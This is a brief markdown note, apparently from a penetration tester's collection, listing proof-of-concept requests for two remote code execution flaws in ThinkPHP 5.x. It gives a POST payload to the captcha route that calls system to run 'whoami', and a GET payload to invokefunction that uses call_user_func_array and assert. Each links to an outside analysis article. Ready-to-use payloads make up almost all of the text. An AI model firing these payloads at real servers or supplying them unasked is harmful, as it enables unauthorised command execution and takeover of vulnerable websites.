# Thinkphp

## ThinkPHP 5.0.0~5.0.23 RCE

## POC

```
http://127.0.0.1/thinkphp/index.php?s=captcha

POST:

_method=__construct&filter[]=system&method=get&get[]=whoami
```

### 漏洞分析

https://xz.aliyun.com/t/3845

## ThinkPHP 5.X RCE

## POC

5.0.x php版本>=5.4

```
http://127.0.0.1/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()
```

### 漏洞分析

https://xz.aliyun.com/t/3570

